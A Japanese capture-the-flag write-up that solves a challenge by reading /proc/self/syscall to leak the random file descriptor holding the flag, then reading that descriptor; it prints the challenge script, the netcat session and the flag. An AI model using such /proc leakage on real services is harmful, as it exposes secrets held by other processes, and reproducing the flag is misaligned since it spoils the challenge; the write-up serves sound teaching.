#　解法

以下のスクリプトが与えられる。

```
import os
import random

fd_flag = random.randint(16, pow(2, 16))
with open('flag', 'r') as f:
  os.dup2(f.fileno(), fd_flag)

def ask_path() -> str:
  path = input('path: /proc/')
  path = f'/proc/{path}'
  if not os.path.exists(path):
    exit('file not found :(')
  elif not os.path.isfile(path):
    exit('not a file :(')
  elif 'flag' in path or '.' in path:
    exit('path not allowed :(')
  return path

def read_file(path: str):
  with open(path, 'r') as f:
    os.dup2(f.fileno(), fd_flag + 1)
    print(os.read(fd_flag + 1, 256))

if __name__ == '__main__':
  path = ask_path()
  read_file(path)

  try:
    fd = int(input('fd: '))
    print(os.read(fd, 256))
  except:
    exit('error :(')
```

`/proc`以下の指定したファイルの内容を表示した後、任意のfdが指すファイルの内容を見ることができるようである。
また、スクリプトの最初では`flag`ファイルをランダムなfdで開いており、このfdを見つけることができればフラグが入手できることがわかる。

スクリプトを読んで処理を追っていくと、`read_file`関数の処理が不自然であることに気づく。
```
def read_file(path: str):
  with open(path, 'r') as f:
    os.dup2(f.fileno(), fd_flag + 1)
    print(os.read(fd_flag + 1, 256))
```
`open`関数の返り値を変数`f`に代入しているため`f.read()`でファイルの内容を読むことができるが、ここではわざわざ`os.read`関数を用いている。
さらにはfdとして`fd_flag + 1`が指定されており、この値が分かれば`fd_flag`の値を求めることができそうである。

そこで`/proc`以下のファイルにおいてfdをテキストとして返してくれるようなものがないか調査すると、`/proc/self/syscall`というファイルが使えそうなことがわかる。
このファイルでは以下のようにシステムコールに与えられた引数の情報を表示できる。
```
$ cat /proc/self/syscall
0 0x3 0x7fe6e9c7e000 0x20000 0x22 0xffffffff 0x0 0x7ffea3be4328 0x7fe6e9b89931
```
例えばこの実行例では、`/proc/self/syscall`というファイルが、catコマンドによって、fd=0x3でreadされている。

つまりここまでにわかったことをまとめると、`/proc/self/syscall`ファイルを表示させることで`fd_flag + 1`の値がわかるため、この値から1を引いた数をfdとして与えることでフラグを入手できる。
したがって、以下のようにフラグを得ることができる（`2641=0xa52-1`)。
```
$ nc localhost 13778
path: /proc/self/syscall
b'0 0xa52 0x7f5d08835480 0x100 0x0 0x0 0x0 0x7ffc08e4cf58 0x7f5d08e29fac\n'
fd: 2641
b'ctf4b{y0u_f0und_7h3_7r3a5ur3_1n_pr0cf5}\n'
```
